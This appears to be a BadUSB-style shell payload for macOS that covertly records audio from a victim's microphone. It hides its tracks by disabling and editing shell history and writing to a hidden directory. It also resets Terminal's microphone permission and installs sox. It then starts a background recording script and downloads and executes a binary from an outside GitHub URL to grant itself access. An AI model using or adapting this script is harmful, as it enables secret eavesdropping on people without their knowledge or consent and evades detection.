# Add environment variable settings to .bashrc and reload it
echo -e "export HISTCONTROL=ignorespace\nunset HISTFILE" >>~/.bashrc
source ~/.bashrc
exec bash

# Clear specific history command
history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')

# Start recording in a screen session
screen -dm bash -c "nohup python3 record.py &"

# Reset microphone permission for Terminal
tccutil reset Microphone com.apple.Terminal

# Create the .phantom_audio directory and navigate into it
mkdir -p ~/.phantom_audio
cd ~/.phantom_audio

# Installing "sox" voice recording dependenice
brew install sox

# Write the Python script for recording
printf 'import os\nimport subprocess\nimport datetime\nfilename = "Secret audio.mp3"\ncmd = "sox -d -C 128 -r 44100 \\"{}\\"".format(filename)\nsubprocess.Popen(cmd, shell=True)\n' >record.py

# Download permission script and execute it
wget -O allow_permission_mac_go 'https://raw.githubusercontent.com/YonKu0/BadUSB/main/Recon/MacOS/Voice%20Logger/allow_permission_mac_go'
chmod +x allow_permission_mac_go
nohup python3 record.py
sleep 0.5
./allow_permission_mac_go
